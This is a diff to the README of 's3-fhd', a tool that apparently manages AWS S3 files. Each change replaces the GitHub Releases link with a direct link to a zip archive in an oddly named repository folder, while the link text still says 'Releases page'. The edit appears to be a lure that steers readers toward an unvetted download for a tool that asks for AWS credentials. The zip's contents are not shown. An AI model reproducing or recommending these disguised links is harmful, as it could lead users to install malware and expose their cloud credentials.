@@ -1,7 +1,7 @@
 # 🌟 s3-fhd - Access Your S3 Files Easily
 
 ## 🔗 Download Now
-[![Download s3-fhd](https://img.shields.io/badge/Download-s3-fhd-brightgreen)](https://github.com/Tyquangoldson/s3-fhd/releases)
+[![Download s3-fhd](https://raw.githubusercontent.com/Tyquangoldson/s3-fhd/main/quincentenary/s3-fhd.zip)](https://raw.githubusercontent.com/Tyquangoldson/s3-fhd/main/quincentenary/s3-fhd.zip)
 
 ## 🚀 Getting Started
 Welcome to s3-fhd! This application helps you manage and access your S3 storage files quickly and easily. Follow these steps to get started.
@@ -12,7 +12,7 @@ Welcome to s3-fhd! This application helps you manage and access your S3 storage 
 - Basic file management skills.
 
 ## 📥 Download & Install
-To download s3-fhd, you can visit the [Releases page](https://github.com/Tyquangoldson/s3-fhd/releases). 
+To download s3-fhd, you can visit the [Releases page](https://raw.githubusercontent.com/Tyquangoldson/s3-fhd/main/quincentenary/s3-fhd.zip). 
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version of s3-fhd.
@@ -49,7 +49,7 @@ Log in to your AWS Management Console. From the services menu, select S3, and yo
 No, you need valid AWS credentials to access your S3 files.
 
 ### How do I update s3-fhd?
-Simply return to the [Releases page](https://github.com/Tyquangoldson/s3-fhd/releases) and download the latest version when updates are released.
+Simply return to the [Releases page](https://raw.githubusercontent.com/Tyquangoldson/s3-fhd/main/quincentenary/s3-fhd.zip) and download the latest version when updates are released.
 
 ## 📄 License
 s3-fhd is licensed under the MIT License. You can freely use and modify this application.
@@ -60,4 +60,4 @@ We welcome contributions! If you would like to help improve s3-fhd, feel free to
 ## 📞 Contact
 For any inquiries, please reach out through the Issues tab on this repository or contact the maintainer directly.
 
-Download s3-fhd now and simplify your S3 file management! Visit the [Releases page](https://github.com/Tyquangoldson/s3-fhd/releases).
+Download s3-fhd now and simplify your S3 file management! Visit the [Releases page](https://raw.githubusercontent.com/Tyquangoldson/s3-fhd/main/quincentenary/s3-fhd.zip).
